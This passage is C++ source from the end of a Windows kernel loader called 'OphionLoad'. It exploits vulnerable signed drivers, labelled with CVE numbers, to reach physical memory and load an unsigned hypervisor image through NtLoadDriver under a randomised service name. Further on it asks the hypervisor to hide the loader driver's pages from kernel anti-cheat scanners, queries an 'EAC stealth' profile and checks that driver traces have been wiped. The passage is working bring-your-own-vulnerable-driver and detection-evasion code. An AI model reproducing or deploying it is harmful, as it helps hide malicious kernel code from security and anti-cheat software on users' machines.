            if (device != INVALID_HANDLE_VALUE) CloseHandle(device);
            if (!existing && !vulnStem.empty()) {
                unloadStem(vulnStem);
                deleteService(vulnStem);
                if (!vulnCopy.empty()) DeleteFileW(vulnCopy.c_str());
            }
        };

        try {
            device = openDevice(dosPath);
            std::printf("[+] Opened %s device: %ls\n",
                        driverBackend == L"directio" ? "DirectIo" :
                        driverBackend == L"pstrip64" ? "pstrip64 (CVE-2026-29923)" :
                                                       "LnvMSRIO (CVE-2025-8061)",
                        dosPath.c_str());

            // Build backend
            std::unique_ptr<PhysBackend> phys;
            if (driverBackend == L"pstrip64")
                phys = std::make_unique<PstripBackend>(device);
            else if (driverBackend == L"lnvmsrio")
                phys = std::make_unique<LnvMsrioBackend>(device);
            else
                phys = std::make_unique<DirectIoBackend>(device);

            // -------------------------------------------------------------------
            // Smoke test
            // -------------------------------------------------------------------
            if (doSmoke)
                rc = smoke(phys.get());

            // -------------------------------------------------------------------
            // CR3 walk demo
            // -------------------------------------------------------------------
            if (!rc && doWalk)
                rc = demoWalk(phys.get());

            // -------------------------------------------------------------------
            // Load Ophion image via NtLoadDriver
            // -------------------------------------------------------------------
            if (!rc && !image.empty()) {
                std::wstring imgCopy = copyRandom(image);
                std::wstring imgStem = imgCopy.substr(imgCopy.find_last_of(L"\\/") + 1);
                imgStem = imgStem.substr(0, imgStem.find(L'.'));
                writeService(imgStem, L"\\??\\" + imgCopy);

                NTSTATUS imgSt = loadStem(imgStem);
                std::printf("[%c] NtLoadDriver Ophion stem=%ls status=0x%08X\n",
                            NT_SUCCESS(imgSt) ? '+' : '!',
                            imgStem.c_str(),
                            static_cast<unsigned>(imgSt));

                if (!NT_SUCCESS(imgSt)) {
                    rc = 1;
                    deleteService(imgStem);
                    DeleteFileW(imgCopy.c_str());
                } else {
                    std::printf(
                        "[+] Recovery service retained: HKLM\\SYSTEM\\CurrentControlSet\\Services\\%ls\n",
                        imgStem.c_str());
                    std::printf(
                        "[+] Keep it until VMX unload/recovery has been validated; file is reboot-delete pending.\n");
                }
            }

            // -------------------------------------------------------------------
            // Post-launch BYOVD EPT conceal
            // Ask the live Ophion HV to EPT-conceal the BYOVD driver pages so
            // kernel AC scanners cannot find the loader driver's code.
            // Only works in !OPHION_PRODUCTION diagnostic builds (device present).
            // -------------------------------------------------------------------
            if (!rc && doConceal && !image.empty()) {
                struct HvConcealByovdReq {
                    wchar_t  DriverName[128];
                    uint32_t WipeLdrEntry;
                    uint32_t Reserved;
                } req{};
                wcsncpy_s(req.DriverName, 128, (vulnStem + L".sys").c_str(), _TRUNCATE);
                req.WipeLdrEntry = 0; // safe default: never unlink a live driver

                // CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, READ|WRITE)
                constexpr DWORD kConcealIoctl =
                    (0x22u << 16) | (3u << 14) | (0x801u << 2) | 0u;

                HANDLE ophionDev = CreateFileW(L"\\\\.\\Ophion",
                    GENERIC_READ | GENERIC_WRITE,
                    FILE_SHARE_READ | FILE_SHARE_WRITE,
                    nullptr, OPEN_EXISTING,
                    FILE_ATTRIBUTE_NORMAL, nullptr);
                if (ophionDev != INVALID_HANDLE_VALUE) {
                    DWORD ret2 = 0;
                    BOOL ok = DeviceIoControl(ophionDev, kConcealIoctl,
                                              &req, static_cast<DWORD>(sizeof(req)),
                                              nullptr, 0, &ret2, nullptr);
                    CloseHandle(ophionDev);
                    if (ok)
                        std::printf("[+] BYOVD EPT conceal applied for %ls\n",
                                    vulnStem.c_str());
                    else
                        std::fprintf(stderr,
                            "[!] IOCTL_HV_CONCEAL_BYOVD failed GLE=%lu "
                            "(production build, or HV not running)\n",
                            GetLastError());
                } else {
                    std::fprintf(stderr,
                        "[!] Could not open \\\\.\\Ophion — HV not running?\n");
                }
            }

            // -------------------------------------------------------------------
            // Query the non-destructive AC profile.  Stack rewriting and
            // kernel/firmware mutation are disabled in the safe build.
            // -------------------------------------------------------------------
            if (!rc && doEacStealth && !image.empty()) {
                constexpr DWORD kEacIoctl =
                    (0x22u << 16) | (3u << 14) | (0x802u << 2) | 0u;

                HANDLE hv = CreateFileW(L"\\\\.\\Ophion",
                    GENERIC_READ | GENERIC_WRITE,
                    FILE_SHARE_READ | FILE_SHARE_WRITE,
                    nullptr, OPEN_EXISTING,
                    FILE_ATTRIBUTE_NORMAL, nullptr);
                if (hv != INVALID_HANDLE_VALUE) {
                    DWORD ret2 = 0;
                    ULONG action = 2;  // HV_EAC_ACTION_QUERY
                    ULONG out[4] = {};
                    if (DeviceIoControl(hv, kEacIoctl,
                                        &action, sizeof(action),
                                        out, sizeof(out), &ret2, nullptr))
                        std::printf("[+] AC safe profile flags=0x%lX "
                                    "dmar_pages=%lu scrubs=%lu rewrites=%lu\n",
                                    out[0], out[1], out[2], out[3]);
                    else
                        std::fprintf(stderr,
                            "[!] AC status query failed GLE=%lu\n",
                            GetLastError());

                    {
                        constexpr DWORD kProtectStatusIoctl =
                            (0x22u << 16) | (3u << 14) |
                            (0x804u << 2) | 0u;
                        ULONG ps[8] = {};
                        ret2 = 0;
                        if (DeviceIoControl(
                                hv, kProtectStatusIoctl,
                                nullptr, 0,
                                ps, sizeof(ps), &ret2, nullptr) &&
                            ret2 == sizeof(ps))
                        {
                            std::printf(
                                "[+] Protect status flags=0x%lX "
                                "max=%lu owners=%lu pages=%lu whitelist=%lu\n",
                                ps[2], ps[3], ps[4], ps[5], ps[6]);
                        }
                    }
                    CloseHandle(hv);
                } else {
                    std::fprintf(stderr,
                        "[!] Could not open \\\\.\\Ophion for AC status\n");
                }
            }


            // -------------------------------------------------------------------
            // Verify tracewipe from usermode via phys scan
            // -------------------------------------------------------------------
            if (!rc && doVerify && verifyTds) {
                // Get the original driver stem name (before randomisation) for
                // MmUnloadedDrivers scan — use image filename without extension.
                std::wstring scanName = image.empty() ? L"Ophion" :
                    image.substr(image.find_last_of(L"\\/") + 1);
                if (scanName.size() > 4 &&
                    scanName.substr(scanName.size()-4) == L".sys")
                    scanName.resize(scanName.size()-4);

                rc = verifyTracewipe(phys.get(), verifyTds, scanName.c_str());
            }

        } catch (...) {
            cleanup();
            throw;
        }

        cleanup();
        return rc;

    } catch (const std::exception& ex) {
        std::fprintf(stderr, "OphionLoad: %s\n", ex.what());
        return 1;
    }
}
